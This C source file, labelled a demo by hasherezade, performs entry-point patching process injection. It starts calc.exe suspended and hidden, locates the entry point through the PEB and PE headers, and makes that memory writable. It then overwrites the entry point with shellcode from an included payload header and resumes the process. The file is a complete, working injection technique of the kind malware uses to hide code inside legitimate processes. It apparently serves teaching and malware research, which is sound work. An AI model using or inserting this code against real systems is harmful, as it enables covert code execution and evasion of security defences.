/*
Injection Demo #1 : Entry Point Patching
CC-BY: hasherezade
*/

#include "main.h"
#include "payload.h"

IMAGE_OPTIONAL_HEADER32 get_opt_hdr(unsigned char *read_proc)
{
    IMAGE_DOS_HEADER *idh = NULL;
    IMAGE_NT_HEADERS *inh = NULL;

    idh = (IMAGE_DOS_HEADER*)read_proc;
    inh = (IMAGE_NT_HEADERS *)((BYTE*)read_proc + idh->e_lfanew);
    return inh->OptionalHeader;
}

void hex_dump(unsigned char *buf, size_t buf_size)
{
    size_t pad = 8;
    size_t col = 16;
    putchar('\n');
    for (size_t i = 0; i < buf_size; i++) {
        if (i != 0 && i % pad == 0) putchar('\t');
        if (i != 0 && i % col == 0) putchar('\n');
        printf("%02X ", buf[i]);
    }
    putchar('\n');
}

BOOL load_ntdll_functions()
{
    HMODULE hNtdll = GetModuleHandleA("ntdll");
    ZwQueryInformationProcess = (long (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hNtdll,"ZwQueryInformationProcess");

    if (ZwQueryInformationProcess == NULL)
    {
        return FALSE;
    }
    return TRUE;
}

int main(void)
{
    if (load_ntdll_functions() == FALSE) {
        printf("Failed to load NTDLL function\n");
        return (-1);
    }

    STARTUPINFO si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    PROCESS_BASIC_INFORMATION pbi;
    memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));

    wchar_t app_path[260];
    ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\calc.exe", (LPWSTR)app_path, sizeof(app_path));
    wprintf(L"Full path = %s\n", app_path);

    if (!CreateProcessW(
            (LPWSTR) app_path, //lpApplicationName
            NULL, //lpCommandLine
            NULL, //lpProcessAttributes
            NULL, //lpThreadAttributes
            NULL, //bInheritHandles
            CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW, //dwCreationFlags
            NULL, //lpEnvironment 
            NULL, //lpCurrentDirectory
            &si, //lpStartupInfo
            &pi //lpProcessInformation
        ))
    {
        printf("[ERROR] CreateProcess failed, Error = %x\n", GetLastError());
        return (-1);
    }

    if (ZwQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
    {
        printf("[ERROR] ZwQueryInformation failed\n");
        return (-1);
    }

    printf("PID = 0x%x\n", pbi.UniqueProcessId);

    DWORD ImageBase = 0;
    DWORD read_bytes = 0;
    if (!ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, sizeof(ImageBase), &read_bytes) && read_bytes != sizeof(ImageBase))
    {
        printf("[ERROR] ReadProcessMemory failed\n");
        return (-1);
    }
    printf("ImageBase = 0x%x\n", ImageBase);

    // read headers in order to find Entry Point:
    unsigned char hdrs_buf[0x1000];
    if (!ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase, hdrs_buf, sizeof(hdrs_buf), &read_bytes) && read_bytes != sizeof(hdrs_buf))
    {
        printf("[-] ReadProcessMemory failed\n");
        return (-1);
    }
    // verify read content:
    if (hdrs_buf[0] != 'M' || hdrs_buf[1] != 'Z') {
        printf("[-] MZ header check failed\n");
        return (-1);
    }

    // fetch Entry Point From headers
    IMAGE_OPTIONAL_HEADER32 opt_hdr = get_opt_hdr(hdrs_buf);
    DWORD ep_rva = opt_hdr.AddressOfEntryPoint;
    printf("EP = 0x%x\n", ep_rva);

    //read code at OEP (this is just a test)
    unsigned char oep_buf[0x30];
    if (!ReadProcessMemory(pi.hProcess, (BYTE*)ImageBase + ep_rva, oep_buf, sizeof(oep_buf), &read_bytes) && read_bytes != sizeof(oep_buf))
    {
        printf("[-] ReadProcessMemory failed\n");
        return (-1);
    }
    printf("OEP dump:\n");
    hex_dump(oep_buf, sizeof(oep_buf));
    putchar('\n');

    //make a memory page containing Entry Point Writable:
    DWORD oldProtect;
    if (!VirtualProtectEx(pi.hProcess,(BYTE*)ImageBase + ep_rva, sizeof(g_Shellcode), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Virtual Protect Failed!\n");
        return (-1);
    }

    // paste the shellcode at Entry Point:
    if (!WriteProcessMemory(pi.hProcess, (BYTE*)ImageBase + ep_rva, g_Shellcode, sizeof(g_Shellcode), &read_bytes) && read_bytes != sizeof(g_Shellcode))
    {
        printf("[-] WriteProcessMemory failed\n");
        return (-1);
    }

    // patching done, resume thread:
    printf("Resuming thread...\n");
    ResumeThread(pi.hThread);

    system("pause");
    return (0);
}
